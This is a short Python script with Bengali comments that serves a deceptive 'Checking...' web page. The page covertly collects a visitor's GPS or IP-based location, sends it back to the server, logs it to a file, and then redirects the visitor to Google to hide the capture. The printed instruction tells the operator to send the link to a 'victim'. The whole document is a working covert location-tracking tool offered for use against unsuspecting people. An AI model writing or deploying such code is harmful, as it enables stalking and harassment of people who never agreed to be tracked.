#!/usr/bin/env python3
"""location_server.py — GPS grabber স্টাইল পেইজ সার্ভ করে"""
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            html = """<html><body><h2>Checking...</h2>
<script>
fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{
  function send(lat,lng,acc,ip){
    new Image().src='/log?lat='+lat+'&lng='+lng+'&acc='+acc+'&ip='+ip;
  }
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      p=>send(p.coords.latitude,p.coords.longitude,p.coords.accuracy,j.ip),
      e=>send(j.latitude,j.longitude,'denied',j.ip));
  } else send(j.latitude,j.longitude,'no-gps',j.ip);
  setTimeout(()=>location.href='https://www.google.com',2000);
});
</script></body></html>"""
            self.send_response(200); self.end_headers(); self.wfile.write(html.encode())
        elif self.path.startswith("/log"):
            import urllib.parse, datetime
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            with open("locations.txt","a") as f:
                f.write(f"{datetime.datetime.now()} {q}\n")
            self.send_response(204); self.end_headers()
        else:
            self.send_response(404); self.end_headers()

print("[+] Server on 0.0.0.0:8000 — victim-ke http://<your-vps-ip>:8000 pathao")
HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()